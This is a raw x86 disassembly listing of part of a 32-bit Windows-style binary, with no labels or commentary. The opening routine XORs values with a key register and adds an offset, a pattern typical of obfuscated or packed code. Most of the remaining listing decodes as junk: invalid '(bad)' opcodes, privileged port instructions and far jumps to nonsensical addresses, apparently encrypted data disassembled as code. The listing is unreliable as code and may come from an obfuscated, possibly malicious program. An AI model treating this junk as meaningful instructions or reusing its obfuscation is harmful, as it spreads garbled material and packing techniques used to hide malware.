  40923c:	xor    DWORD PTR [ebp+0x17],ecx
  40923f:	lea    ecx,[ebx]
  409241:	dec    eax
  409242:	or     BYTE PTR [eax+0x519e8db7],dl
  409248:	cli    
  409249:	ins    DWORD PTR es:[edi],dx
  40924a:	xor    dl,al
  40924c:	push   esi
  40924d:	adc    eax,ecx
  40924f:	or     BYTE PTR ds:0x4edc037b,ah
  409255:	repnz xor eax,esi
  409258:	add    eax,ebx
  40925a:	mov    DWORD PTR [ebp-0x54],eax
  40925d:	lea    eax,[ebp-0x1c]
  409260:	mov    DWORD PTR [ebp-0x50],eax
  409263:	mov    eax,DWORD PTR [ebp-0x60]
  409266:	xor    eax,esi
  409268:	add    eax,ebx
  40926a:	mov    DWORD PTR [ebp-0x60],eax
  40926d:	lea    eax,[ebp-0x60]
  409270:	push   eax
  409271:	mov    eax,DWORD PTR [ebp+0xc]
  409274:	xor    eax,esi
  409276:	add    eax,ebx
  409278:	push   eax
  409279:	mov    eax,ds:0x414b1e
  40927e:	push   0x414a74
  409283:	push   DWORD PTR [eax]
  409285:	call   0x411333
  40928a:	jmp    0x4092c1
  40928f:	cmp    edi,0x13c
  409295:	jne    0x4092c1
  40929b:	mov    eax,DWORD PTR [ebp-0x10]
  40929e:	xor    eax,esi
  4092a0:	add    eax,ebx
  4092a2:	mov    DWORD PTR [ebp+0x8],eax
  4092a5:	mov    eax,ds:0x414afe
  4092aa:	mov    DWORD PTR [ebp+0x8],eax
  4092ad:	mov    eax,DWORD PTR [ebp-0x14]
  4092b0:	mov    DWORD PTR [ebp-0x4],eax
  4092b3:	mov    eax,DWORD PTR [ebp-0x4]
  4092b6:	push   0x4
  4092b8:	pop    ecx
  4092b9:	sub    ecx,eax
  4092bb:	add    ecx,DWORD PTR [ebp-0x18]
  4092be:	mov    DWORD PTR [ebp-0x8],ecx
  4092c1:	mov    eax,DWORD PTR [ebp+0xc]
  4092c4:	xor    eax,esi
  4092c6:	lea    edi,[edi+eax*1+0x327299]
  4092cd:	cmp    edi,0x50a
  4092d3:	jne    0x4089c6
  4092d9:	mov    eax,DWORD PTR [ebp+0xc]
  4092dc:	pop    edi
  4092dd:	xor    eax,esi
  4092df:	pop    esi
  4092e0:	add    eax,ebx
  4092e2:	pop    ebx
  4092e3:	leave  
  4092e4:	ret    0x8
  4092e7:	push   ebp
  4092e8:	mov    ebp,esp
  4092ea:	sub    esp,0x44
  4092ed:	push   edi
  4092ee:	adc    DWORD PTR ds:0x434637,ebx
  4092f4:	mov    eax,DWORD PTR [ebp+0xc]
  4092f7:	mov    DWORD PTR [ebp-0x10],eax
  4092fa:	and    DWORD PTR ds:0x43463b,0x5787
  409304:	jmp    0x40971b
  409309:	jns    0x4092bd
  40930b:	out    dx,al
  40930c:	std    
  40930d:	jge    0x40938c
  40930f:	or     eax,0x11d61472
  409314:	clc    
  409315:	pop    edi
  409316:	mov    eax,ds:0xe29254d9
  40931b:	jle    0x40939b
  40931d:	jo     0x409398
  40931f:	jle    0x40939f
  409321:	dec    edx
  409322:	shr    BYTE PTR [ebx],0xdc
  409325:	xor    DWORD PTR [esi-0x18],esp
  409328:	les    ecx,FWORD PTR [edi-0x14]
  40932b:	xchg   ecx,eax
  40932c:	pusha  
  40932d:	jmp    0xda2470c6
  409332:	inc    ebx
  409333:	pop    edi
  409334:	xchg   edi,eax
  409335:	fcom   QWORD PTR [edx+0x1f32bf0e]
  40933b:	(bad)  
  40933c:	icebp  
  40933d:	cmp    DWORD PTR [edi+ebx*8],ebx
  409340:	push   eax
  409341:	cli    
  409342:	xchg   DWORD PTR [esi+eiz*8+0x619aa97f],esi
  409349:	push   ecx
  40934a:	cwde   
  40934b:	mov    dl,0x33
  40934d:	fst    QWORD PTR ds:0xaa646d25
  409353:	or     al,0x63
  409355:	ins    DWORD PTR es:[edi],dx
  409356:	cmp    DWORD PTR [ebp-0x3b79f0b9],edi
  40935c:	push   esp
  40935d:	(bad)  
  40935e:	push   eax
  40935f:	or     DWORD PTR [eax+0x3],0xa
  409363:	in     al,0x98
  409365:	jo     0x409304
  409367:	es div BYTE PTR gs:[eax+edi*8+0x6]
  40936d:	fsubr  QWORD PTR [edi+0x7c82a21e]
  409373:	jbe    0x4093cd
  409375:	xchg   esp,eax
  409376:	jg     0x4093cd
  409378:	sbb    BYTE PTR [edi+eiz*4+0x2f],bh
  40937c:	and    DWORD PTR [esi],eax
  40937e:	es retf 0x8826
  409382:	jns    0x40933a
  409384:	mov    dl,0xaa
  409386:	ret    
  409387:	mov    bh,0x59
  409389:	ret    0x74bb
  40938c:	ret    0xe951
  40938f:	sub    ecx,DWORD PTR [edx-0x6e]
  409392:	inc    edi
  409393:	xor    eax,0x77052197
  409398:	pop    esi
  409399:	xchg   ebx,eax
  40939a:	push   0xfffffff2
  40939c:	add    DWORD PTR [ebp+0x48db12c6],esp
  4093a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4093a3:	inc    ecx
  4093a4:	and    al,0xc0
  4093a6:	inc    eax
  4093a7:	lods   al,BYTE PTR ds:[esi]
  4093a8:	loope  0x40939f
  4093aa:	push   esi
  4093ab:	xchg   ecx,eax
  4093ac:	dec    ebx
  4093ad:	out    0xb,al
  4093af:	fsubr  st(2),st
  4093b1:	sahf   
  4093b2:	aam    0x77
  4093b4:	(bad)  
  4093b5:	lock jno 0x409397
  4093b8:	mov    bl,0xa3
  4093ba:	sub    al,0x36
  4093bc:	fcomp  DWORD PTR [ebp-0x64621ec4]
  4093c2:	add    al,0x74
  4093c4:	(bad)  
  4093c5:	xchg   esp,eax
  4093c6:	and    DWORD PTR [ebx],edi
  4093c8:	(bad)  
  4093c9:	pop    eax
  4093ca:	js     0x409366
  4093cc:	jmp    0x7a31580d
  4093d1:	push   0x3f936516
  4093d6:	cld    
  4093d7:	fld    QWORD PTR [edi-0x6f]
  4093da:	std    
  4093db:	mov    al,ds:0x548b8f57
  4093e0:	jg     0x40940a
  4093e2:	gs mov dl,0xd2
  4093e5:	jnp    0x4093ad
  4093e7:	pmulhuw mm1,QWORD PTR [esi+ebx*4+0x6e]
  4093ec:	loope  0x4093d2
  4093ee:	shrd   DWORD PTR [ecx+ebx*8+0x4336d49b],ebx,cl
  4093f6:	pop    ebp
  4093f7:	mov    dh,0x12
  4093f9:	xor    eax,0x6317e035
  4093fe:	inc    eax
  4093ff:	fs ins BYTE PTR es:[edi],dx
  409401:	mov    ds:0xb497ad84,al
  409406:	call   0xe9b0a05f
  40940b:	loope  0x409463
  40940d:	pop    eax
  40940e:	std    
  40940f:	sub    dl,cl
  409411:	xor    esp,ecx
  409413:	pop    esp
  409414:	test   DWORD PTR [eax+edx*1+0x4d],ebx
  409418:	pop    ebx
  409419:	leave  
  40941a:	ror    BYTE PTR [esi+0x453df5b1],0x14
  409421:	xor    ebx,DWORD PTR [ecx+0x9]
  409424:	clc    
  409425:	mov    ch,0xbf
  409427:	adc    BYTE PTR [edi-0x601e2cba],al
  40942d:	mov    dh,BYTE PTR [eax+ecx*8-0x68]
  409431:	push   0xffffffd0
  409433:	fidiv  WORD PTR [ecx]
  409435:	add    eax,DWORD PTR [esp+ebx*4]
  409438:	dec    edi
  409439:	pop    esi
  40943a:	loopne 0x409466
  40943c:	ror    dh,1
  40943e:	nop
  40943f:	inc    esp
  409440:	push   ebx
  409441:	mov    WORD PTR [ebp-0x5c6b0059],ds
  409447:	xchg   ecx,eax
  409448:	mov    bh,0x4b
  40944a:	jecxz  0x4094c3
  40944c:	mov    esp,ebp
  40944e:	(bad)  
  40944f:	leave  
  409450:	daa    
  409451:	add    edx,DWORD PTR [eax-0x55]
  409454:	mov    al,0xf1
  409456:	(bad)  
  409457:	test   eax,0xd2738f5e
  40945c:	add    DWORD PTR [edi+0x60a3ae1d],0x2e849cc7
  409466:	push   edx
  409467:	imul   edx,DWORD PTR [eax],0xffffff8d
  40946a:	xor    al,0x3e
  40946c:	popf   
  40946d:	lods   eax,DWORD PTR ds:[esi]
  40946e:	cmp    eax,DWORD PTR [ecx+0x57]
  409471:	mov    bh,0x77
  409473:	pop    ss
  409474:	sahf   
  409475:	push   esi
  409476:	stos   DWORD PTR es:[edi],eax
  409477:	in     al,0xe8
  409479:	cmp    ch,BYTE PTR [edx]
  40947b:	ror    cl,cl
  40947d:	or     ecx,edi
  40947f:	sbb    eax,ebx
  409481:	sbb    esp,esi
  409483:	jae    0x4094c8
  409485:	(bad)  [ecx]
  409487:	out    0x49,al
  409489:	popa   
  40948a:	sub    edx,DWORD PTR ds:0x5caad5e8
  409490:	mov    ds:0x30ecac3,al
  409495:	sbb    al,0xea
  409497:	sub    BYTE PTR [ebx+edx*8],ah
  40949a:	test   BYTE PTR [esi-0x61889b0c],cl
  4094a0:	in     al,dx
  4094a1:	addr16 into 
  4094a3:	and    BYTE PTR ds:0xe062e63c,0x4
  4094aa:	or     eax,0xdc9ca164
  4094af:	fcomp  DWORD PTR [eax+0x1a]
  4094b2:	inc    esi
  4094b3:	cmp    BYTE PTR [edx+ebp*4],al
  4094b6:	sbb    eax,0x52c32e68
  4094bb:	xchg   BYTE PTR [ecx],bl
  4094bd:	loope  0x409522
  4094bf:	mov    dl,0xf3
  4094c1:	fidivr DWORD PTR [ebx]
  4094c3:	dec    edi
  4094c4:	sub    al,0x22
  4094c6:	cmp    al,BYTE PTR [edi-0x14]
  4094c9:	and    BYTE PTR [ebp+0x1d2045fc],bl
  4094cf:	bnd ret 0x2228
  4094d3:	fcom   QWORD PTR [ebx]
  4094d5:	test   BYTE PTR ds:0x4f60b7e5,al
  4094db:	pop    eax
  4094dc:	mov    al,ds:0x586c8434
  4094e1:	xor    BYTE PTR [edx],0x6d
  4094e4:	xor    eax,0xb0cf379
  4094e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4094ea:	jns    0x409522
  4094ec:	addr16 and ch,ch
  4094ef:	out    dx,al
  4094f0:	mov    eax,0xc5bed3df
  4094f5:	and    al,0x25
  4094f7:	dec    edx
  4094f8:	sub    BYTE PTR [ecx],bl
  4094fa:	pushf  
  4094fb:	inc    edx
  4094fc:	in     eax,0xd0
  4094fe:	into   
  4094ff:	in     al,0x1b
  409501:	push   esp
  409502:	mov    al,0xaf
  409504:	loop   0x40953e
  409506:	in     al,0xac
  409508:	call   0x6c67ea0f
  40950d:	xor    BYTE PTR [edi+esi*1],cl
  409510:	jo     0x4094ee
  409512:	pop    eax
  409513:	imul   ebx,esi,0x730b8e7c
  409519:	cmp    al,0x46
  40951b:	dec    edi
  40951c:	ficom  WORD PTR [edi-0x1f]
  40951f:	and    BYTE PTR ds:0xc523e60e,al
  409525:	cmp    eax,DWORD PTR ds:0x59a63a12
  40952b:	icebp  
  40952c:	dec    eax
  40952d:	in     eax,dx
  40952e:	dec    eax
  40952f:	mov    ecx,0xd254ba
  409534:	inc    edx
  409535:	mov    fs,WORD PTR ds:0x9554e0f4
  40953b:	ud0    edi,DWORD PTR [ecx-0x207b269a]
  409542:	es enter 0x5d9b,0xa3
  409547:	mov    ecx,DWORD PTR ds:0xa097a6cf
  40954d:	jb     0x409578
  40954f:	inc    eax
  409550:	test   al,0x20
  409552:	cs in  al,0xc5
  409555:	cmp    dh,ch
  409557:	test   al,0x6a
  409559:	adc    DWORD PTR [esi-0x51e23060],0x74d142e2
  409563:	sub    ebx,edx
  409565:	or     DWORD PTR [esi-0x36a41eda],0xf89b9e8
  40956f:	aas    
  409570:	out    0x88,al
  409572:	enter  0x60ea,0x2f
  409576:	ins    BYTE PTR es:[edi],dx
  409577:	retf   
  409578:	mov    edx,0x470bd633
  40957d:	inc    eax
  40957e:	xor    al,0xdf
  409580:	test   BYTE PTR [edi],al
  409582:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409583:	xchg   edx,eax
  409584:	add    dh,BYTE PTR [edi+0x21]
  409587:	(bad)  
  409588:	aad    0x49
  40958a:	dec    dx
  40958c:	popf   
  40958d:	push   esi
  40958e:	(bad)  
  40958f:	lods   al,BYTE PTR ds:[esi]
  409590:	xchg   BYTE PTR [ecx+0x73],ch
  409593:	inc    ecx
  409594:	xchg   ecx,eax
  409595:	pusha  
  409596:	jnp    0x409549
  409598:	push   esp
  409599:	xor    al,0x73
  40959b:	ret    
  40959c:	add    BYTE PTR [edx],bh
  40959e:	xchg   ebp,eax
  40959f:	das    
  4095a0:	jb     0x409590
  4095a2:	xchg   esi,eax
  4095a3:	aad    0x9a
  4095a5:	cmp    bl,al
  4095a7:	add    ch,BYTE PTR [edi+edi*2]
  4095aa:	mov    al,ds:0xed3ca657
  4095af:	ss ret 0x1ee1
  4095b3:	pop    ss
  4095b4:	shr    DWORD PTR [edi],0x63
  4095b7:	mov    edx,0xb3acedd6
  4095bc:	arpl   WORD PTR [esi],sp
  4095be:	xchg   edx,eax
  4095bf:	mov    bl,0xa0
  4095c1:	cld    
  4095c2:	inc    ecx
  4095c3:	sbb    ch,bl
  4095c5:	jnp    0x40957e
  4095c7:	fwait
  4095c8:	(bad)  
  4095c9:	adc    ebp,DWORD PTR [edx]
  4095cb:	adc    edx,DWORD PTR [ebx+0x673a9e7b]
  4095d1:	inc    edx
  4095d2:	xchg   edx,eax
  4095d3:	xchg   esp,eax
  4095d4:	mov    WORD PTR [edi],ds
  4095d6:	dec    ecx
  4095d7:	inc    ebp
  4095d8:	mov    dh,0x74
  4095da:	(bad)  
  4095db:	fnsave [edi-0x42e51570]
  4095e1:	repnz or esi,DWORD PTR [ebp-0x3f]
  4095e5:	lahf   
  4095e6:	cmp    DWORD PTR [edi+0x65008098],eax
  4095ec:	(bad)  
  4095ed:	cmp    DWORD PTR [ebx-0x23],edi
  4095f0:	mov    esi,0x1fd562ef
  4095f5:	shl    BYTE PTR [edi+0x7ed8fbe0],1
  4095fb:	aam    0x4a
  4095fd:	ins    BYTE PTR es:[edi],dx
  4095fe:	cmp    bl,0x20
  409601:	test   DWORD PTR [edi-0x30],edi
  409604:	clc    
  409605:	cmp    DWORD PTR [ebx],ebx
  409607:	arpl   WORD PTR [ebx-0x4c],ax
  40960a:	dec    ecx
  40960b:	and    eax,0xc5877933
  409610:	sbb    BYTE PTR [ecx],dh
  409612:	lods   eax,DWORD PTR ds:[esi]
  409613:	pop    ecx
  409614:	cmp    dl,BYTE PTR [edi+eiz*1+0x2e66b46b]
  40961b:	mov    DWORD PTR ds:0xd4f358b3,ecx
  409621:	rcr    BYTE PTR [ecx+0x6ad82526],1
  409627:	call   0xd164:0x6e5c6db2
  40962e:	dec    ebp
  40962f:	inc    ebx
  409630:	push   ecx
  409631:	stos   BYTE PTR es:[edi],al
  409632:	push   esi
  409633:	(bad)  
  409634:	(bad)  
  409635:	ins    BYTE PTR es:[edi],dx
  409636:	mov    esp,ebp
  409638:	push   cs
  409639:	adc    edi,ebx
  40963b:	ds add eax,0xf111eb30
  409641:	pop    edi
  409642:	and    eax,0xb76534ea
  409647:	jle    0x409661
  409649:	clc    
  40964a:	fwait
  40964b:	dec    eax
  40964c:	test   eax,0x9705cb9
  409651:	mov    esi,0xa8107a8b
  409656:	cmc    
  409657:	jae    0x40960d
  409659:	gs es xchg ecx,eax
  40965c:	inc    ebp
  40965d:	test   DWORD PTR [ebx+esi*8],ecx
  409660:	jns    0x409691
  409662:	lds    eax,FWORD PTR ds:0x767951ae
  409668:	sub    DWORD PTR [esi],esi
  40966a:	popf   
  40966b:	jo     0x409691
  40966d:	or     dh,BYTE PTR [eax-0x32]
  409670:	inc    esi
  409671:	out    0x87,al
  409673:	inc    ebx
  409674:	addr16 out 0x63,al
  409677:	es xor edi,ebx
  40967a:	push   ebp
  40967b:	mov    bl,0x1c
  40967d:	cmp    ch,BYTE PTR [edi+0x5c]
  409680:	test   esi,0x12d673b9
  409686:	inc    edx
  409687:	stc    
  409688:	(bad)  
  40968a:	sbb    eax,0x9075cd74
  40968f:	shr    edx,1
  409691:	or     esp,DWORD PTR [eax-0x1d]
  409694:	cmp    eax,0xf764da22
  409699:	add    BYTE PTR [ebp+0x4c5f68db],dl
  40969f:	pop    ebp
  4096a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4096a1:	in     eax,0xc9
  4096a3:	jb     0x409634
  4096a5:	add    al,0x5f
  4096a7:	int    0xe
  4096a9:	les    ecx,FWORD PTR [edx-0x3d86a1ba]
  4096af:	imul   ecx,DWORD PTR [edx],0x4b
  4096b2:	and    ecx,DWORD PTR [ebp+0x4d]
  4096b5:	xor    ebp,0xe5e4b09f
  4096bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4096bc:	and    al,0xba
  4096be:	(bad)  
  4096c0:	rcr    BYTE PTR [edi],0xcd
  4096c3:	adc    dl,BYTE PTR ds:0xbde0fa6b
  4096c9:	(bad)  
  4096cb:	pop    edx
  4096cc:	adc    bh,ch
  4096ce:	sub    esp,DWORD PTR [edi-0x36b379c1]
  4096d4:	iret   
  4096d5:	xchg   ebx,eax
  4096d6:	add    al,0xe2
  4096d8:	mov    DWORD PTR [ecx],0x70a1b15d
  4096de:	xor    DWORD PTR [ebp-0x61],esi
  4096e1:	pop    edi
  4096e2:	fisttp WORD PTR [esi+ecx*1-0x5628ce12]
  4096e9:	mov    WORD PTR [bx+si],ss
  4096ec:	les    esp,FWORD PTR [ecx-0x43]
  4096ef:	scas   eax,DWORD PTR es:[edi]
  4096f0:	sar    bh,0xf4
  4096f3:	and    eax,0x1ddd38c0
  4096f8:	sub    eax,0xa6044c8e
  4096fd:	add    ah,bl
  4096ff:	inc    ebp
  409700:	dec    eax
  409701:	mov    bh,0x62
  409703:	pop    edx
  409704:	fucom  st(4)
  409706:	mov    dl,0x6
  409708:	out    0x2d,al
  40970a:	test   DWORD PTR [eax],eax
  40970c:	das    
  40970d:	shr    ch,1
  40970f:	(bad)  
  409710:	std    
  409711:	ins    BYTE PTR es:[edi],dx
  409712:	push   eax
  409713:	mov    edi,0x9213bdae
  409718:	push   0xffffffa9
  40971a:	sub    al,0x8b
  40971c:	inc    ebp
  40971d:	or     BYTE PTR [ebx+0x43470f3d],cl
  409723:	add    BYTE PTR [ecx],cl
  409725:	cmp    eax,0x434713
  40972a:	mov    DWORD PTR [ebp+0x8],0xf89c8536
  409731:	xor    edi,0x551
  409737:	mov    DWORD PTR [ebp-0x20],0xf89c8539
  40973e:	movzx  ecx,WORD PTR ds:0x4345f3
  409745:	add    ecx,DWORD PTR ds:0x434637
  40974b:	mov    DWORD PTR ds:0x4345f3,ecx
  409751:	mov    edx,DWORD PTR [ebp+0x8]
  409754:	jmp    0x409b6b
  409759:	jmp    0x409767
  40975b:	or     al,0xd8
  40975d:	std    
  40975e:	fdiv   st,st(3)
  409760:	sbb    eax,0x3c00db39
  409765:	in     eax,dx
  409766:	mov    ch,0x1c
  409768:	and    eax,0x7e7eee94
  40976d:	jo     0x4097e8
  40976f:	jle    0x4097ef
  409771:	jmp    0x4097e2
  409773:	pop    es
  409774:	mov    ?,WORD PTR [esi-0x1f333dd0]
  40977a:	jmp    0xdc45f060
  40977f:	jl     0x4097e9
  409781:	ret    
  409782:	inc    esi
  409783:	sbb    DWORD PTR [edx+0x48],esp
  409786:	add    eax,0x14dcf855
  40978b:	mov    al,0xad
  40978d:	push   0xffffffdc
  40978f:	mov    ds:0xe39a32e6,al
  409794:	inc    edi
  409795:	xchg   esi,eax
  409796:	xchg   DWORD PTR [edx+edi*8-0x16b88fd2],ebx
  40979d:	dec    esp
  40979e:	xor    ecx,DWORD PTR [edi+edi*2]
  4097a1:	mov    ecx,0x8907329f
  4097a6:	and    al,0xcf
  4097a8:	out    0xc8,al
  4097aa:	dec    edi
  4097ab:	pusha  
  4097ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4097ad:	add    DWORD PTR [ecx-0x7074ccec],edx
  4097b3:	call   FWORD PTR [ebx+0x72e420fa]
  4097b9:	lods   eax,DWORD PTR ds:[esi]
  4097ba:	jecxz  0x4097a2
  4097bc:	fld    st(4)
  4097be:	cli    
  4097bf:	jmp    0x409804
  4097c1:	bound  esi,QWORD PTR [ecx+0x3c01e23]
  4097c7:	ffree  st(7)
  4097c9:	xor    eax,0x66f7d58e
  4097ce:	sbb    ebx,0x38242522
  4097d4:	pop    eax
  4097d5:	dec    ebx
  4097d6:	adc    ebx,edx
  4097d8:	(bad)  
  4097d9:	cmp    edi,DWORD PTR [edi-0x1e3c2750]
  4097df:	push   eax
  4097e0:	mov    esi,esi
  4097e2:	sub    eax,0xa6693b63
  4097e7:	inc    esp
  4097e8:	je     0x4097c0
  4097ea:	or     ebx,DWORD PTR [eax]
  4097ec:	test   al,0xed
  4097ee:	and    cl,cl
  4097f0:	jle    0x4097a7
  4097f2:	imul   cl
  4097f4:	mov    dh,0x3e
  4097f6:	cld    
  4097f7:	test   BYTE PTR ds:0x3c98081d,dh
  4097fd:	fld    QWORD PTR [edi-0x4]
  409800:	bound  edi,QWORD PTR [ebp-0x1797de17]
  409806:	lock inc ebx
  409808:	cmp    eax,0x1df8231f
  40980d:	mov    bl,0x3a
  40980f:	jns    0x4097c9
  409811:	xchg   esi,eax
  409812:	fstp   TBYTE PTR ds:0x1bba8191
  409818:	xchg   ebx,eax
  409819:	xchg   ebx,eax
  40981a:	sar    BYTE PTR [eax],1
  40981c:	jo     0x4097b8
  40981e:	addr16 icebp 
  409820:	ret    
  409821:	into   
  409822:	inc    ecx
  409823:	rcl    DWORD PTR [edi-0x32adc82d],cl
  409829:	sub    BYTE PTR [edi-0x71ec5ac0],dh
  40982f:	cmp    BYTE PTR [ebp-0x34],bl
  409832:	inc    edi
  409833:	dec    ebx
  409834:	inc    edx
  409835:	xor    eax,0xdf98bef6
  40983a:	clc    
  40983b:	lods   al,BYTE PTR ds:[esi]
  40983c:	ret    0x51f9
  40983f:	dec    esi
  409840:	sub    al,0x6b
  409842:	mov    ebp,0xe180f6b3
  409847:	pop    es
  409848:	or     al,0x4
  40984a:	fcom   st(0)
  40984c:	iret   
  40984d:	retf   0x656e
  409850:	dec    ebx
  409851:	sahf   
  409852:	std    
  409853:	fild   DWORD PTR [eax+0x30]
  409856:	ror    eax,0xb2
  409859:	or     eax,0x57a97b18
  40985e:	aam    0xdf
  409860:	ds jno 0x4098be
  409863:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409864:	mov    cs,esi
  409866:	and    BYTE PTR es:[eax],0xe1
  40986a:	xchg   ebp,eax
  40986b:	out    0x55,al
  40986d:	jbe    0x4098bd
  40986f:	fidivr WORD PTR [esp+ebp*2+0x539b4c49]
  409876:	ins    DWORD PTR es:[edi],dx
  409877:	sbb    DWORD PTR [esi-0x6e],ebx
  40987a:	lock mov BYTE PTR [eax],ch
  40987d:	sar    BYTE PTR [ecx+0x7d99ccb4],1
  409883:	sbb    eax,0x14d7ee9e
  409888:	imul   ecx,DWORD PTR [eax+0x3a],0x1b0fd421
  40988f:	jg     0x409854
  409891:	jmp    0x266a:0x7b3908bc
  409898:	test   eax,0x7cc24e02
  40989d:	test   eax,0xedf567a
  4098a2:	and    eax,0x4d4d6d47
  4098a7:	pop    ebx
  4098a8:	lods   al,BYTE PTR ds:[esi]
  4098a9:	stos   DWORD PTR es:[edi],eax
  4098aa:	das    
  4098ab:	loop   0x4098a4
  4098ad:	dec    edx
  4098ae:	inc    eax
  4098af:	dec    ebp
  4098b0:	jmp    0xe441a316
  4098b5:	ficomp WORD PTR [edi-0x16]
  4098b8:	int    0xe2
  4098ba:	pusha  
  4098bb:	and    eax,0x68bc6b23
  4098c0:	std    
  4098c1:	push   edi
  4098c2:	xlat   BYTE PTR ds:[ebx]
  4098c3:	xor    dl,ch
  4098c5:	fcom   DWORD PTR [ebx]
  4098c7:	(bad)  
  4098ca:	call   0x4f1423f6
  4098cf:	jmp    0xac28:0x490a5192
  4098d6:	xchg   edi,eax
  4098d7:	cmp    edi,DWORD PTR [esp+ebx*4+0x62]
  4098db:	ret    
  4098dc:	mov    esi,0xe7037564
  4098e1:	popf   
  4098e2:	xor    DWORD PTR [eax-0x5db95a4f],0xffffffa0
  4098e9:	fs jmp 0x2c7b:0x1fb5dd7
  4098f1:	or     BYTE PTR [edx],al
  4098f3:	lods   eax,DWORD PTR ds:[esi]
  4098f4:	mov    ds:0x67a99248,al
  4098f9:	sbb    DWORD PTR ds:0x26eb92e9,edi
  4098ff:	shl    BYTE PTR [ebp-0x52d3ee86],1
  409905:	dec    eax
  409906:	jmp    0x1816:0x2c5d18ca
  40990d:	popf   
  40990e:	push   dx
  409910:	sti    
  409911:	fcmovb st,st(2)
  409913:	(bad)  
  409914:	enter  0xe366,0xe5
  409918:	cmp    cl,BYTE PTR [eax]
  40991a:	lods   eax,DWORD PTR ds:[esi]
  40991b:	add    BYTE PTR [ebx+0x7],bh
  40991e:	loop   0x4098fc
  409920:	stos   BYTE PTR es:[edi],al
  409921:	adc    al,0x5a
  409923:	xor    ch,al
  409925:	inc    esp
  409926:	cmp    al,0x80
  409928:	in     eax,0x12
  40992a:	sub    BYTE PTR [edx-0xb],dl
  40992d:	cmc    
  40992e:	sbb    BYTE PTR [eax-0x23],bh
  409931:	iret   
  409932:	leave  
  409933:	mov    ebx,0x4a638296
  409938:	imul   DWORD PTR [ebp+0x43]
  40993b:	(bad)  
  40993c:	sbb    esi,ebp
  40993e:	(bad)  
  40993f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409940:	adc    cl,BYTE PTR [ecx-0x60]
  409943:	and    DWORD PTR ds:0x77ffd1c3,esp
  409949:	in     eax,dx
  40994a:	fdivp  st(4),st
  40994c:	sbb    BYTE PTR [ecx+0x17],cl
  40994f:	cmp    esp,DWORD PTR [eax+eax*1]
  409952:	and    BYTE PTR [esi+eiz*2-0x273b3a32],ah
  409959:	rcl    BYTE PTR [edi+esi*1+0x461bf1bb],0x6e
  409961:	push   eax
  409962:	(bad)  
  409963:	clc    
  409964:	cwde   
  409965:	rol    BYTE PTR [edi-0x6fcbb1bf],1
  40996b:	sbb    ah,0x9c
  40996e:	mov    ds:0xc4fb2c4b,al
  409973:	aaa    
  409974:	cs in  eax,dx
  409976:	iret   
  409977:	test   DWORD PTR [ebx+esi*4],0x594fbaa8
  40997e:	inc    esp
  40997f:	sub    al,0x46
  409981:	mov    ds:0x376193b2,eax
  409986:	pop    ds
  409987:	mov    eax,0xd957b4cb
  40998c:	lock jnp 0x4099de
  40998f:	into   
  409990:	scas   eax,DWORD PTR es:[edi]
  409991:	es xor al,0x82
  409994:	inc    esi
  409995:	sbb    edx,DWORD PTR [esi]
  409997:	aas    
  409998:	mov    eax,0xb4fd41a
  40999d:	fisubr DWORD PTR [edi-0x51329c09]
  4099a3:	and    DWORD PTR [edx-0x67],esi
  4099a6:	dec    eax
  4099a7:	(bad)  
  4099a8:	out    0x57,eax
  4099aa:	call   DWORD PTR [esi-0x26d40bc0]
  4099b0:	ficomp WORD PTR [esi-0x7f]
  4099b3:	jae    0x409a0a
  4099b5:	mov    BYTE PTR [esi+eax*8+0x6d2549d3],al
  4099bc:	xor    al,0x1a
  4099be:	cmp    DWORD PTR [ebp-0x62589f3d],ecx
  4099c4:	aam    0x2c
  4099c6:	loope  0x409957
  4099c8:	ror    DWORD PTR [edx-0x31b5b192],1
  4099ce:	pop    ecx
  4099cf:	mov    al,ds:0x583db946
  4099d4:	fistp  QWORD PTR [ebp+0x38]
  4099d7:	push   ebx
  4099d8:	push   0x8
  4099da:	xchg   edi,eax
  4099db:	popa   
  4099dc:	sub    DWORD PTR [ecx+0x72],0x20
  4099e0:	stos   DWORD PTR es:[edi],eax
  4099e1:	or     bl,BYTE PTR [edx-0x4e02d9d6]
  4099e7:	jo     0x409a35
  4099e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4099ea:	stc    
  4099eb:	push   eax
  4099ec:	and    edi,DWORD PTR [edi+0x13]
  4099ef:	stc    
  4099f0:	pop    edi
  4099f1:	and    al,0xc
  4099f3:	daa    
  4099f4:	and    esi,DWORD PTR ds:0xdb517ce6
  4099fa:	xor    al,BYTE PTR [eax+0x6ed8c9c4]
  409a00:	mov    DWORD PTR [ecx+ecx*1],esi
  409a03:	mov    ds:0xa6320a72,eax
  409a08:	ret    
  409a09:	retf   0x548e
  409a0c:	int3   
  409a0d:	and    edx,DWORD PTR [esi+0x17]
  409a10:	stos   DWORD PTR es:[edi],eax
  409a11:	sahf   
  409a12:	fs in  eax,dx
  409a14:	jns    0x4099ca
  409a16:	add    BYTE PTR [edx-0x33453771],0xae
  409a1d:	shl    bh,1
  409a1f:	scas   eax,DWORD PTR es:[edi]
  409a20:	scas   eax,DWORD PTR es:[edi]
  409a21:	cmp    BYTE PTR [edi-0x80],0x7e
  409a25:	(bad)  
  409a26:	xchg   esp,eax
  409a27:	stos   BYTE PTR es:[edi],al
  409a28:	xor    BYTE PTR [edx+ebp*1],ch
  409a2b:	icebp  
  409a2c:	dec    ebp
  409a2d:	dec    ebx
  409a2e:	aam    0x64
  409a30:	imul   esi,DWORD PTR [esi],0x2b
  409a33:	mov    bh,0x9d
  409a35:	inc    esi
  409a36:	cmp    al,0xc7
  409a38:	lds    edx,FWORD PTR [edx]
  409a3a:	xchg   ecx,eax
  409a3b:	push   ds
  409a3c:	out    dx,eax
  409a3d:	(bad)  
  409a3e:	inc    edi
  409a3f:	mov    bh,0x78
  409a41:	xchg   edi,eax
  409a42:	repnz arpl WORD PTR [ecx],si
  409a45:	call   0x757e6cb3
  409a4a:	sahf   
  409a4b:	sbb    bl,cl
  409a4d:	pop    esp
  409a4e:	adc    BYTE PTR [esi],cl
  409a50:	jp     0x4099fc
  409a52:	out    0x99,eax
  409a54:	shl    DWORD PTR [eax-0x1a],cl
  409a57:	jecxz  0x409a66
